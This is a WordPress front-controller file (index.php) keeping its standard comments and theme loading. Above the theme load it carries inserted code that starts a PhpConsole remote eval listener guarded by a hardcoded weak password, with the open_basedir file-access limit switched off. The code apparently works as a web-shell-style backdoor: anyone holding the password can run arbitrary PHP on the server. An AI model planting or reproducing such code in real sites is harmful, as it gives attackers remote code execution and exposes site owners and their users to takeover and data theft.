<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */

 
 
require_once(__DIR__ . '/PhpConsole/__autoload.php');
// PhpConsole\Handler::getInstance()->start();  // start handling PHP errors & exceptions
$connector = PhpConsole\Connector::getInstance();
$connector->setPassword('QWEqweASDasd');
$evalProvider = $connector->getEvalDispatcher()->getEvalProvider();
$evalProvider->disableFileAccessByOpenBaseDir();
PhpConsole\Helper::register();

$connector->startEvalRequestsListener();
 
 

 
 
 
 define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );

// PC::debug(get_included_files());
